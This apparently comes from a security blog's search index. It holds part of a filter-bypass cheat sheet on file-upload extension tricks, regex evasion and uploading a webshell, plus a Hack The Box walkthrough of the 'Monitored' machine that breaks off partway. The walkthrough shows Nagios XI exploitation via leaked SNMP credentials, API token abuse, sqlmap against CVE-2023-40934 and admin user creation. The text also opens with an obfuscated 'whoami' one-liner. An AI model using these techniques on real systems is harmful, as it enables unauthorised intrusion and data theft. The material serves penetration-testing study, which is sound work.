iex &#34;$(&#39;imaohw&#39;[-1..-20] -join &#39;&#39;)&#34; Filename Filters &#x1f447; For fuzzing file extensions with file upload forms, check out the next section.
Use different extension or even use two extensions. Useful for poorly-written file extension logic that use &ldquo;contains&rdquo; instead or &ldquo;ends with&rdquo; checks.
totally_an_image.png.php Check out the PayloadAllTheThings lists for PHP, or ASP/.NET file extension bypasses.
Use the right extension, but the wrong magic bytes:
hexedit webshell.php # Overwrite first four bytes with FFD8 DDE0; Append FFD9 to the end. mv webshell.php profilepic.jpg (Note quite a bypass, per se) Abuse a wildcard * character by formatting filenames as command arguments. Check out this paper - definitely worth reading.
[root@defensecode public]# ls -al total 72 drwxrwxrwx. 2 user user 4096 Mar 28 04:47 . drwx------. 24 user user 4096 Oct 28 18:32 .. -rwxr-xr-x. 1 user user 201 Oct 28 17:43 download.php -rw-r--r--. 1 leon leon 0 Mar 28 04:45 -e sh shell.c -rwxr-xr-x. 1 user user 56 Oct 28 17:47 footer.php -rwxr-xr-x. 1 leon leon 31 Mar 28 04:45 shell.c [root@defensecode public]# rsync -t *.c foo:src/ Insert a null-byte to truncate the string. See some examples where I&rsquo;ve used it.
phpecho.pdf # becomes phpecho.php%00.pdf Regex These are some ways that I&rsquo;ve bypassed regex-based filters.
Use CRLF characters, or even just a LF / newline. See this blog post for how this fools ruby and python (if multiline support is not included).
I like to use {{7*&#39;7&#39;}} SSTIs # becomes I like to use \\n{{7*&#39;7&#39;}} SSTIs Be sure to put the newline character before the &ldquo;bad&rdquo; characters
Use tabs instead of spaces
Use alternating case or capitals. Yep, sometimes the developer forgets to do the obvious.
test_case # becomes TeSt_CaSe #or TEST_CASE This is effective because Linux is case-senstive, but Windows is case-insensitive
As such, if we&rsquo;re attacking Linux, we can convert to lowercase on the fly. Use any case input and shove it through tr (see Character Shifting) to map all of the uppercase letters into lowercase:
$(tr &#34;[A-Z]&#34; &#34;[a-z]&#34;&lt;&lt;&lt;&#34;WhOaMi&#34;) EXAMPLE: FILE EXTENSION FUZZING I&rsquo;m trying to use ZAP more often these days, so here&rsquo;s how you can use ZAP + ffuf to fuzz for usable file extensions in a file upload vulnerability.
The scenario: there is a profile picture upload form. File extensions are being validated by a blacklist on both the frontend and backend.
We will easily bypass the frontend by using ZAP instead of the upload form. The trick here is how we bypass the backend too.
First, let&rsquo;s perform a file upload with a regular (image) file and extension and proxy it through ZAP:
We can already see that the site is using PHP for the file upload. The POST body is a whole bunch of raw data representing the image.
Using this knowledge, let&rsquo;s grab a suitable wordlist of extensions to fuzz with. PayloadAllTheThings has tons of wordlists for this type of fuzzing, but a this is a good one for PHP. Download that file as php_extensions.lst
&#x2b50; There is a very comprehensive wordlist of file extensions here, in Seclists:
/usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt
It&rsquo;s around 60k lines long, but includes practically every variant of every file format that you could think of. It also contains double-extension bypasses, null-byte character insertions, and all kinds of other fantastic bypasses. This is definitely a good wordlist to use for file-extension filter bypass for an actual pentest or bug bounty.
Right-click and send the proxied request to the Requester tab:
From here, let&rsquo;s modify the request body a bit. Exchange the body of the content disposition with a simple line of PHP. By including recognizable text like this, it&rsquo;ll make our fuzzing task much easier:
&#x261d;&#xfe0f; Click Send once to &ldquo;save&rdquo; the new request. This just makes it easier to perform multiple runs of the Fuzz window. If you&rsquo;re worried about sending that first erroneous request, you can do all the modifications from within the Fuzz window instead.
Now right-click on the request and select Fuzz. The Fuzz window will open. Noting that the entries of php_extensions.lst all have a . prefixed to them, we will select the text .EXT and click the Add button to select this portion for fuzzing; the Payloads modal window will open.
&#x261d;&#xfe0f; Note that there is a button that toggles the mode between Edit and Save. We need the mode to be in its &ldquo;Saved&rdquo; state before we can select the portion of the request to fuzz.
Comparing this to Burp, we&rsquo;re doing the equivalent of their &ldquo;Sniper&rdquo; attack from Intruder.
From within the Payloads window, click the Add button and select what we want that portion of the request fuzzed with. We&rsquo;ll use a simple wordlist / file mode, so choose type File and select php_extensions.lst:
Click Add to set the payload, then OK to close the Payloads window. You should now see the fuzzed portion highlighted:
Now that everything is defined, click Start Fuzzer and see the results arrive in the Fuzzer tab:
Noting the response body size, we can see that responses fall into two different categories. Opening these up, we can see that some were successful uploads and some were not, giving an indication of which file extensions bypassed the filter.
But there&rsquo;s a catch: the fact that some of the file extensions bypassed the filter does not mean that they can execute the PHP payload. For checking that, let&rsquo;s use ffuf with a size matcher to test for our test string&rsquo;s length:
echo -n &#39;## ITS WORKING ##&#39; | wc -c # 17 characters long ffuf -w php_extensions.lst -u http://94.237.57.59:43507/profile_images/beaverFUZZ \\ -c -t 60 -timeout 4 -ic -ac -v -ms 17 Almost instantaneously, we have our result:
&#x1f4a1; If we wanted ffuf to just check for any uploads that passed the filter, we could use ffuf with a regex matcher instead:
ffuf -w php_extensions.lst -u http://94.237.57.59:43507/profile_images/beaverFUZZ \\ -c -t 60 -timeout 4 -ic -ac -v -mr &#39;## ITS WORKING ##&#39; This text will be present as long as the file uploaded, regardless of whether or not the PHP can actually execute.
We can Ctrl+click the successful result to navigate to that page and see that it did indeed work, and is executing our PHP:
As a final step, we can upload a webshell. Just go back to the Requester tab and exchange our PHP echo payload for the contents of your favourite webshell. Also, be sure to set the file extension to the one we just determined through fuzzing:
Click Send then navigate to the resulting page to utilize the webshell &#x1f4b0;
CONCLUSION These are some bypasses that I&rsquo;ve found useful. If I had a proper &ldquo;checklist&rdquo; for doing bypasses of any kind, these would all be near the top. I hope you find it useful as well.
`,url:"https://4wayhandshake.github.io/strategy/filter-bypass/"},"https://4wayhandshake.github.io/walkthrough/monitored/":{title:"Monitored",tags:["Nagios","Nagios XI","SQLi (Blind)","CVE","Services","SUID Bash"],categories:["Walkthrough","HTB","Linux","Medium"],content:`INTRODUCTION Monitored was released as the second box of HTB&rsquo;s Season IV, &ldquo;Savage Lands&rdquo;. As is evident from visiting the index page of the box, this one centers around Nagios, an IT administration and monitoring solution for enterprise. The documentation for Nagios XI is extremely scant, which proves to be one of the main stumbling points of this box. At least 90% of the effort for this box is spent on gaining a foothold - a moment which feels perpetually just out-of-reach. Nevertheless, this box is a hard teacher: reminding us to never give up and always hack harder.
Initial recon is very easy, but once you find yourself actually seeking a foothold things get more challenging. Foothold is an excellent lesson in effective web enumeration - especially API fuzzing. Extra research into historical vulnerabilities will also be a huge asset for this box.
After gaining a foothold, the user flag is instantaneous. With even a minimal amount of investigation, local privesc sticks out like a sore thumb. An experienced player will probably have the root flag within minutes of getting a shell on the box.
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 389/tcp open ldap 443/tcp open https 5667/tcp open unknown Having LDAP exposed is notable.
Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0) | ssh-hostkey: | 3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA) | 256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA) |_ 256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519) 80/tcp open http Apache httpd 2.4.56 |_http-server-header: Apache/2.4.56 (Debian) |_http-title: Did not follow redirect to https://nagios.monitored.htb/ 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X 443/tcp open ssl/http Apache httpd 2.4.56 ((Debian)) |_http-title: Nagios XI | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK | Not valid before: 2023-11-11T21:46:55 |_Not valid after: 2297-08-25T21:46:55 |_http-server-header: Apache/2.4.56 (Debian) 5667/tcp open tcpwrapped Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Note the redirect to https://nagios.monitored.htb. That&rsquo;s also a slightly old version of LDAP (current LTS is 2.5.17)
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 389/tcp open ldap 443/tcp open https |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug) 5667/tcp open unknown No result there.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
PORT STATE SERVICE VERSION 69/udp closed tftp 123/udp open ntp NTP v4 (unsynchronized) 136/udp closed profile 137/udp closed netbios-ns 158/udp closed pcmail-srv 161/udp open snmp SNMPv1 server (public) 497/udp closed retrospect 1025/udp closed blackjack 1029/udp closed solid-mux 1433/udp closed ms-sql-s 1701/udp closed L2TP 1812/udp closed radius 2000/udp closed cisco-sccp 3456/udp closed IISrpc-or-vat 4444/udp closed krb524 32771/udp closed sometimes-rpc6 49153/udp closed unknown 49156/udp closed unknown 49192/udp closed unknown Service Info: Host: monitored Note that any open|filtered ports are either open or (much more likely) filtered.
SNMP v1 is also notable. If memory serves, that is vulnerable to a really simple password-guessing attack. I&rsquo;ll check this out later &#x1f6a9;
Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=template.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt&#34; gobuster vhost -w $WLIST -u http://$RADDR \\ --random-agent -t 10 --timeout 5s \\ --output &#34;fuzzing/vhost-gobuster-root.txt&#34; \\ --no-error Ok, it looks like the server is doing some kind of wildcard matching on the Host header. May as well just skip the remaining vhost scans, since we know about https://nagios.monitored.htb already.
I&rsquo;ll move on to directory enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; gobuster dir -w $WLIST -u https://nagios.$DOMAIN -k \\ --random-agent -t 60 --timeout 5s -f -e \\ --status-codes-blacklist 400,401,402,403,404,405 \\ --output &#34;fuzzing/directory-gobuster-$DOMAIN.txt&#34; \\ --no-error &#x261d;&#xfe0f; Note the usage of the -k flag to accept the self-signed certificate.
Directory enumeration against https://nagios.monitored.htb/ only showed the index page. Examining a few links on the index page though, I can see that every link actually points to https://nagios.monitored.htb/nagiosxi/. So let&rsquo;s try enumerating there instead:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; gobuster dir -w $WLIST -u https://nagios.$DOMAIN/nagiosxi/ -k \\ --random-agent -t 60 --timeout 5s -f -e \\ --status-codes-blacklist 400,401,402,403,404,405 \\ --output &#34;fuzzing/directory-gobuster-$DOMAIN.txt&#34; \\ --no-error Sorry about the width of the following image. The redirects were very long
Whoa! Now we&rsquo;re talking! &#x1f4aa; Most of those results point to a login page, but the HTTP200 ones particularly interesting. For example, /nagiosxi/terminal:
They appear to have just left a webshell for me &#x1f602; Thanks? It&rsquo;s possible this is a rabbit hole, but this will be one of the first things I check as soon as I gain a credential &#x1f6a9;
Exploring the Website As expected, when I navigate to the IP address, I&rsquo;m asked to redirect to https://nagios.monitored.htb. Accepting the redirect results in a pretty basic page. Notably, there is some information in the page footer:
What is this Nagios thing? Clicking on the lefthand link brings us to /nagiosxi/about. While it does not show a version number, it does reference a few open source projects that we may encounter later:
Some particular Open Source projects and development communities we&rsquo;d like to thank include: The PHP development community, the MySQL and Postgres development communities, the ADODB project team, The Jquery project team and expanded jQuery community, the Silk icon set author at famfamfam.com, the PHPMailer team, the RRDTool project, the Nagios Core project, the Nagios Plugins projects, the PNP project, the NagVis project, the NagiosQL project, the Vartour Style project, the author of the FNagios image pack, and the entire Nagios Community and greater OSS community members who make great OSS solutions a possibility through their tireless contributions. We just wanted to let you know that we think you rock.*
Clicking on the righthand link brings us to the actual https://www.nagios.com/ page. The page describes their product, an IT monitoring solution. I wanted to explore this page and see if maybe I could recover some default credentials. Exploring the Support section revealed that SNMP may indeed be a good thing to check first:
Checking out the Installation Guide (Linux) article shows some disappointing info - there will be no default credentials:
&quot;&hellip;The most important setting you need to change here is the Administrator Password (you don&rsquo;t need to use the one that is randomly generated)&hellip;&quot;
Vulnerability Research After searching a little about Nagios, I found an the following CVEs that might be useful:
CVE-2019-15949 Authenticated privesc to root. Valid for NagiosXI versions 5.6.5 and earlier, but was patched in 2019. Check out this PoC code.
CVE-2021-37343 Path traversal. Valid for NagiosXI prior to 5.8.5. Can use it read files, and even for RCE under certain circumstances.
CVE-2021-25296 OS shell command injection. Valid for version 5.7.5. Only applicable to Windows targets.
CVE-2023-40934 Authenticated SQL injection. Valid for version 5.11.0 to 5.11.1. Seems like it was a pretty big deal, and quite recent too.
Exploring SNMP Recalling that SNMP v1 is pretty antiquated, it seems like a good thing to investigate first. I&rsquo;ll run through the Hacktricks &ldquo;automatic commands&rdquo;.
snmp-check $RADDR This checked to see if it could query SNMP using the community string (like a password) public. The results were&hellip; comprehensive. I got details about:
The host, its uptime.
It&rsquo;s IP info, all of its routes, basic stats about networking.
All running processes &#x1f924;
Notably, an sh command to run a service, with what definitely looks like a password:
​	Did we just find the credential svc : XjH7VCehowpR1xZB ?
The path to a configuration file for nagios: The user and group that is running snmpd: The user and group that is running shellinabox, that webshell that we can access at /nagiosxi/terminal:
Some details about postgres and the location of its configuration file: The user and group that are running LDAP: Every package installed on the machine, complete with version number.
Having just gained something that seems a lot like a credential, I&rsquo;ll try logging in to anything I know about: SSH, shellinabox, and all of the /nagiosxi/[endpoint] pages:
SSH &#x274c; shellinabox &#x274c; /nagiosxi/login.php &#x274c; This did bring up something a little odd, though. Attempting to login at /nagiosxi/login.php using the svc credential produced a response like this:
Whereas when attempting to login with a credential that definitely does NOT exist produces a response like this:
&#x1f914; I&rsquo;m not quite sure what to think about this yet. But clearly, there is something special about this credential. I should keep trying it elsewhere around the site &#x1f6a9;
Exploring LDAP I&rsquo;ll start by running LDAP scripts using nmap:
nmap -n -sV --script &#34;ldap* and not brute&#34; $RADDR 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X | ldap-search: | Context: dc=monitored,dc=htb | dn: dc=monitored,dc=htb | objectClass: top | objectClass: dcObject | objectClass: organization | o: monitored.htb |_ dc: monitored | ldap-rootdse: | LDAP Results | &lt;ROOT&gt; | namingContexts: dc=monitored,dc=htb | supportedControl: 2.16.840.1.113730.3.4.18 | supportedControl: 2.16.840.1.113730.3.4.2 | supportedControl: 1.3.6.1.4.1.4203.1.10.1 | supportedControl: 1.3.6.1.1.22 | supportedControl: 1.2.840.113556.1.4.319 | supportedControl: 1.2.826.0.1.3344810.2.3 | supportedControl: 1.3.6.1.1.13.2 | supportedControl: 1.3.6.1.1.13.1 | supportedControl: 1.3.6.1.1.12 | supportedExtension: 1.3.6.1.4.1.4203.1.11.1 | supportedExtension: 1.3.6.1.4.1.4203.1.11.3 | supportedExtension: 1.3.6.1.1.8 | supportedLDAPVersion: 3 | supportedSASLMechanisms: DIGEST-MD5 | supportedSASLMechanisms: NTLM | supportedSASLMechanisms: CRAM-MD5 |_ subschemaSubentry: cn=Subschema Unsurprisingly, this shows the domain DC=monitored,DC=htb. Let&rsquo;s see if we can use anonymous credentials with LDAP:
ldapsearch -x -H ldap://$RADDR -D &#39;&#39; -w &#39;&#39; -b &#34;DC=monitored,DC=htb&#34; Nothing. Maybe I&rsquo;ll try with credentials?
ldapsearch -x -H ldap://$RADDR -D &#39;monitored.htb\\svc&#39; -w &#39;XjH7VCehowpR1xZB&#39; -b &#34;DC=monitored,DC=htb&#34; Perhaps I&rsquo;m not doing it right, or perhaps this is the wrong approach entirely. I&rsquo;ll put LDAP down for now and reapproach it later &#x1f6a9;
The Login Form After I gained (what seems like) a credential, I went to check out the login page at /nagiosxi/login.php. The credential didn&rsquo;t work there, but I&rsquo;ll take a closer look.
One thing that stands out right away is that debug parameter. This nsp thing looks like it might be related to CSRF protection, but the documentation is really bad.
SQLi bypass WLIST=/usr/share/seclists/Fuzzing/Databases/sqli.auth.bypass.txt ffuf -w $WLIST:FUZZ -u https://nagios.monitored.htb/nagiosxi/login.php -r -X POST -t 40 -c \\ -H &#34;Content-Type: application/x-www-form-urlencoded&#34; \\ -b &#34;nagiosxi=b3ffgt8vfnud9pk8pmcfk3171j&#34; \\ -d &#34;nsp=228d167dacf08ca91ec7b8e5d91cfbc3a839aed62894226b01f9e615793c47a5&amp;page=auth&amp;debug=&amp;pageopt=login&amp;redirect=%2Fnagiosxi%2Findex.php%3F&amp;username=FUZZ&amp;password=password123&amp;loginButton=&#34; \\ -fr &#39;Invalid username or password.&#39; the debug parameter As far as I can tell, this debug parameter has no effect on the login page. Perhaps if I was able to cause a server error, I might get a stack trace or something, as long as this parameter is set.
FOOTHOLD Investigating the API Perhaps this should more correctly be in the Recon section, but since I found that /nagios/api directory, it probably makes sense to see what kind of API endpoints exist. Sometimes, fuzzing an API can reveal some clues about what to look for, even if it&rsquo;s just through error messages or by revealing seemingly-benign configuration details. I&rsquo;ll use ffuf to look into this:
WLIST=/usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt for METHOD in GET POST; do ffuf -w $WLIST:FUZZ -u https://nagios.monitored.htb/nagiosxi/api/FUZZ \\ -X $METHOD -t 80 -c -timeout 4 -v -mc all -fc 404; done Whoa, tons of results!
Spot-checking a few of these endpoints reveals that I&rsquo;m missing some kind of API key to access them properly:
Hmm, ok. All of the responses with size 32 appear to be saying that same message. Just to be sure that I got all the endpoints, I double-checked with a much larger wordlist:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ \\ -t 80 -c -timeout 4 -v -mc all -fc 404 -fs 32 &#x1f634; It&rsquo;s very slow-going. Only 26 requests per second&hellip; I will go make some tea and come back.
PAYDIRT! This looks very promising:
Navigating to /nagiosxi/api/v1/authenticate shows a new error message:
Well, let&rsquo;s do as we&rsquo;re told:
Great, so then let&rsquo;s hope they&rsquo;re being literal, and provide username and password parameters. Thankfully, we already found some (hopefully) valid credentials through SNMP enumeration:
&#x1f34d; Alright! We just got an auth_token! The downside: it&rsquo;s only valid for five minutes. It seems consistent, and doesn&rsquo;t mind reauthenticating arbitrarily often.
I&rsquo;ll try using it on some other API endpoints now. After several guesses, I finally found the correct parameter to use:
&#x261d;&#xfe0f; the correct parameter is one word, lowercase: apikey. However, it seems like the auth token and API key are actually different entitites.
&#x1f914; I suppose that makes sense, since this auth token is only valid for 5 minutes, and an API key is usually a permanent (or a lot more long-term)
I&rsquo;ve only ever seen three ways to handle this before:
We pass the auth token in place of, or in addition to, the username and password from the login form. We include the auth token as a Bearer token in every request. Using the auth token in the place of a password. Since there&rsquo;s the least guesswork in trying (3), I&rsquo;ll go for that first:
Nope, that didn&rsquo;t work. What about method (2)?
Hmm, nope also no luck. It says your session has timed out. Ok, how about method (1) then?
I was avoiding method (1) because now I need to guess what the parameter for the auth token might be called. On top of that, there&rsquo;s the CSRF check to contend with.
&#x1f61e; Ugh, yep, this is what I was worried about&hellip; I can&rsquo;t just toss the request into Burp Repeater and try a whole bunch of different names for the auth token parameter, one after another - this would cause me to fail the CSRF check, as shown here:
After quite a bit of guess-and-fail (*sob*), I finally found it! Here&rsquo;s the login sequence that worked for me:
In the browser, navigate to https://nagios.monitored.htb/nagiosxi/login.php
Enter the username svc and password XjH7VCehowpR1xZB. Don&rsquo;t click Login yet.
Run the curl command to obtain a new auth token:
curl -k -d &#34;username=svc&amp;password=XjH7VCehowpR1xZB&#34; https://nagios.monitored.htb/nagiosxi/api/v1/authenticate Copy the auth token to clipboard, switch to the browser window.
Click Login, and proxy the request through Burp
Insert an extra parameter in the POST body: &amp;token=[paste_token_here] (see below)
Forward the request (and stop proxying). You&rsquo;re now logged-in &#x1f44d;
Now we can freely navigate around:
The first thing I did was obtain my API key, from exactly where the documentation said it would be:
For copy-paste purposes, th API Key is 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK.
Maybe it&rsquo;s unimportant, but the User Sessions screen shows that svc previously used /includes/components/actions/runcmd.php. Is this a way to get RCE? &#x1f6a9;
In an attempt to see if I could run the same thing, I tried using the API key I just found. The API was claiming that my accound had timed out, that the account was disabled - all kinds of things. So, I&rsquo;ve regenerated the API Key. The new one is:
GUNkTJBFODErmSdFHERRJu20rh5S6npu6rBjVpjDCptWu0unj70MhR6fULGJAGhq Also, the access to the dashboard means we can finally have positive confirmation of the Nagios version that we&rsquo;re targetting:
&#x1f6a8; This version is vulnerable to one of the CVEs that I noted in the vulnerability research section! l&rsquo;ll follow-up on this in the next section &#x1f6a9;
Next, I checked if the other pages that turned up from directory enumeration were accessible. Notably, we are still denied access to the /nagiosxi/admin page:
Investigating CVE-2023-40934 When I took a closer look at it, CVE-2023-40934 turned out to be the main vulnerability in a family of four different vulnerabilities. I found a blog post outlining exactly how one can exploit it. It seems like, when the user is presented with a banner from the dashboard, they can acknowledge that they&rsquo;ve seen it.
So what&rsquo;s the harm? Well, for some reason, the state of this banner being acknowledged or not is actually held in NagiosXI&rsquo;s database. When we acknowledge the banner, a database transaction occurs. The transaction is caused by a request very much like this one occurring:
POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1 Host: nagios.monitored.htb User-Agent: curl/8.5.0 Accept: */* Content-Length: 38 Content-Type: application/x-www-form-urlencoded Connection: close action=acknowledge_banner_message&amp;id=3 If it were possible to do this unauthenticated, we could simply throw this request into sqlmap and let it do its thing. However, the request requires a valid cookie.
To gain the cookie, I&rsquo;ll log in using the same method as before, then copy the cookie from my browser&rsquo;s Dev Tools:
Just to reiterate, this is the login process:
# Get the auth token curl -sk -d &#34;username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=600&#34; https://nagios.monitored.htb/nagiosxi/api/v1/authenticate | grep -oE &#39;[0-9a-fA-F]{40}&#39; Then, perform the login, proxying the request through Burp. Insert the auth token into the request. Issue the login request, then grab the cookie from the response or from Dev Tools.
Now I&rsquo;ll include that cookie in a curl request and proxy it through burp:
curl --proxy &#34;127.0.0.1:8081&#34; -k https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php -d &#34;action=acknowledge_banner_message&amp;id=3&#34; -b &#39;nagiosxi=ltd0esvgs50cip5cf4gjgt9snm&#39; From Burp proxy, I&rsquo;ll save the request as banner_msg.req so I can input it into sqlmap easily.
sqlmap -r banner_msg.req &hellip;which is equivalent to&hellip;
sqlmap -u &#39;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php&#39; --data=&#39;action=acknowledge_banner_message&amp;id=3&#39; --cookie=&#39;nagiosxi=ltd0esvgs50cip5cf4gjgt9snm&#39; And we have success!
That&rsquo;s great. Now I can enumerate the database using sqlmap!
Given that it&rsquo;s boolean-based blind, I don&rsquo;t think it&rsquo;s a candidate for popping an OS shell. Still nice, though.
First, get the name of the database:
sqlmap -r banner_msg.req --batch --dbs # nagiosxi Now get a list of the tables:
sqlmap -r banner_msg.req --batch -D &#39;nagiosxi&#39; --tables #+-----------------------------+ #| xi_auditlog | #| xi_auth_tokens | #| xi_banner_messages | #| xi_cmp_ccm_backups | #| xi_cmp_favorites | #| xi_cmp_nagiosbpi_backups | #| xi_cmp_scheduledreports_log | #| xi_cmp_trapdata | #| xi_cmp_trapdata_log | #| xi_commands | #| xi_deploy_agents | #| xi_deploy_jobs | #| xi_eventqueue | #| xi_events | #| xi_link_users_messages | #| xi_meta | #| xi_mibs | #| xi_options | #| xi_sessions | #| xi_sysstat | #| xi_usermeta | #| xi_users | #+-----------------------------+ The xi_users table stands out right away. If we want to attack SNMP, then xi_mibs and xi_trapdata would be very useful.
Indeed, the xi_users table has some very useful info inside:
These are bcrypt hashes, salted. They might be hard to crack.
I also dumped the xi_mibs and xi_trapdata tables, in case they become useful later.
Not only is there a password hash, but there is also a higher-privilege API key. Note that the nagiosadmin user is actually enabled. In previous attempts to access the API endpoints using the API key of svc, I was consistently getting an error saying &ldquo;this account is disabled&rdquo;. This gives me a couple ideas:
Use the admin API Key to attain RCE using an API endpoint (perhaps that run_command.php one?) Crack the admin password hash, then use the /nagiosxi/terminal page to gain RCE. Cracking the hash I&rsquo;ll get started cracking the hash first, in case it takes a long time (or never finds a result). I&rsquo;m using hashcat. These are bcrypt hashes, so we need mode 3200
Then, to crack the hashes and ignore usernames:
WLIST=/usr/share/wordlists/rockyou.txt hashcat -m 3200 --usernames passwords.hash $WLIST Usually on HTB, if we&rsquo;re going to crack the hash, it&rsquo;ll happen using rockyou and it will succeed almost immediately. Since I didn&rsquo;t have immediate success, I&rsquo;m not confident this is the right approach.
Update: After running for a couple hours, I never cracked the password hash. I don&rsquo;t think this will be an option.
Using the API Key As shown in the screenshot above, the nagiosadmin API key is:
IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL Let&rsquo;s try interacting with the API using this key:
curl -kL https://nagios.monitored.htb/nagiosxi/api/v1/[endpoint] \\ -d &#39;apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&#39; A list of all the API endpoints are visible from the Help tab of the dashboard that svc has access to:
They even helpfully provide a curl command showing how to query these:
curl -XGET &#34;https://nagios.monitored.htb/nagiosxi/api/v1/objects/hoststatus?apikey=GUNkTJBFODErmSdFHERRJu20rh5S6npu6rBjVpjDCptWu0unj70MhR6fULGJAGhq&amp;pretty=1&#34; However, I suspect that what I&rsquo;m seeing is a list of API endpoints tailored to what svc can see. I want to query the API to see what nagiosadmin can see. Another page within Help confirms this suspicion:
So, I guess we&rsquo;re going straight back to fuzzing the API. This time I&rsquo;ll focus on the /nagiosxi/api/v1/system and /nagiosxi/api/v1/config endpoints.
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt&#34; API_KEY=&#34;IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&#34; ffuf -w $WLIST:FUZZ -u &#34;https://nagios.monitored.htb/nagiosxi/api/v1/system/FUZZ?apikey=$API_KEY&amp;pretty=1&#34; \\ -t 80 -c -timeout 4 -v -mc all -fc 404 -fs 41 Some results that I got were:
/status /user /user/me /info /command API Interaction as nagiosadmin /status is uninteresting. It shows some info about how the nagios process and it&rsquo;s basic configuration.
/user is a little more interesting, it shows a user I didn&rsquo;t know about earlier (/user/me doesn&rsquo;t show anything):
/info just shows the build ID and version numbers for nagios.
/command seems to show a log of commands that have previously executed&hellip; I wonder if there&rsquo;s more to this &#x1f914;
/user endpoint Hoping that I might find a way to reconfigure a user, I started fuzzing /nagiosxi/api/v1/system/user. If I could find some endpoint like /nagiosxi/api/v1/system/user/2/enable or something like that, perhaps I could enable user 2, svc. And if they&rsquo;re enabled, maybe they can access /nagiosxi/terminal with credentials?
Guessing that it might be a GET endpoint, I tried fuzzing /nagiosxi/api/v1/system/user/2/FUZZ with ffuf. Unfortunately, there were no results.
Next, I wondered if maybe I should check some POST requests? If it&rsquo;s a POST, then the user ID is probably rolled into the request body, so I&rsquo;ll omit it from the URI:
WLIST=/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt API_KEY=&#34;IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&#34; ffuf -w $WLIST:FUZZ -u &#34;https://nagios.monitored.htb/nagiosxi/api/v1/system/user/FUZZ?apikey=$API_KEY&amp;pretty=1&#34; \\ -t 80 -c -timeout 4 -v -mc all -fc 404 -X POST Oddly enough, I&rsquo;m getting a different response size for the POSTs than then GETs&hellip; Let&rsquo;s examine one:
Aha! So POST /nagiosxi/api/v1/system/user is for registering a user! With any luck, they&rsquo;ll be &ldquo;enabled&rdquo; by default &#x1f91e;
API_KEY=&#34;IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&#34; curl -k -d &#34;username=jimbob&amp;email=jimbob@monitored.htb&amp;name=jimbob&amp;password=password123&#34; \\ &#34;https://nagios.monitored.htb/nagiosxi/api/v1/system/user/FUZZ?apikey=$API_KEY&amp;pretty=1&#34; Looking good so far! The user is registered and they are enabled. The new user is jimbob : password123
Drats. Didn&rsquo;t work&hellip;
All it really did was give me an easier login to the dashboard. When I logged in, I was forced to reset my password, so it&rsquo;s now jimbob : password456
